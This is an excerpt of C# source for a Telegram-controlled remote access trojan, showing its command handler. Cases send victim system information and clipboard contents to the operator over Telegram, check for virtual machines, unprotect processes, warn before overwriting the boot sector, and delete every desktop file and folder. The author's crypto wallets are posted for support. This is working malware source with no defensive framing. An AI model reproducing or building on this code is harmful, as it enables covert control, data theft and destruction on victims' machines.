    ...
    internal sealed class commands
    {
        ...
        public static void handle(string command)
        {
            ...
            switch (args[0])
            {
                ...
                case "SUPPORT":
                    {
                        telegram.sendText($"BTC Wallet: {config.SupportBTCWallet}");
                        telegram.sendText($"XMR Wallet: {config.SupportXMRWallet}");
                        break;
                    }
                // RemoveAllMachines
                case "REMOVEALLMACHINES":
                    {
                        try
                        {
                            ...
                            telegram.sendText("Succesfully removed all devices.");
                            telegram.sendText("BOT Stops listening...");

                            break;
                        }
                        catch (Exception e)
                        {
                            telegram.sendText("❌ Error occured");
                            telegram.sendText($"{e}");
                            break;
                        }
                    }
                ...
                case "COMPUTERINFO":
                    {
                        string secure = SystemInformation.Secure.ToString();
                        ...
                        telegram.sendText(
                            ...
                            "\nVirtualBox: " + persistence.inVirtualMachine() +
                            "\n" +
                            "\n🔭 Software:" +
                ...
                case "CLIPBOARDSET":
                    {
                        ...
                        // Log
                        telegram.sendText($"📋 Clipboard content changed to: {text}");
                        break;
                    }
                // ClipboardGet
                case "CLIPBOARDGET":
                ...
                case "UNPROTECTPROCESS":
                    {
                        ...
                        telegram.sendText("✔ Process un-protected!");
                        break;
                    }
                case "WATCHSIMPSONS":
                    {
                        telegram.sendText("URL: https://hurawatch.com/series/the-simpsons-0qwn5");
                ...
                case "OVERWRITEBOOTSECTOR":
                    {
                        telegram.sendText("❌ Warning! System will be destroyed!");
                        telegram.sendText("If you wish to continue: /OverwriteBootSector");

                        break;
                    }
                // DeleteAllDesktopItems
                case "DELETEALLDESKTOPITEMS":
                    {
                        try
                        {
                            System.IO.DirectoryInfo DesktopPath = new DirectoryInfo($@"C:\Users\{Environment.UserName}\Desktop\");


                            foreach (FileInfo file in DesktopPath.EnumerateFiles())
                            {
                                file.Delete();
                            }
                            foreach (DirectoryInfo dir in DesktopPath.EnumerateDirectories())
                            {
                                dir.Delete(true);
                            }

                            telegram.sendText("All Desktop item's we're deleted succesfully!");
                            break;

                        }
                        catch (Exception e)
                        {
                            telegram.sendText("❌ error has been occured.");
                            telegram.sendText($"{e}");
                            break;
                        }
                    }
                ...
                default:
                    {
                        ...
                        telegram.sendText("Execute: /help - for commands.");
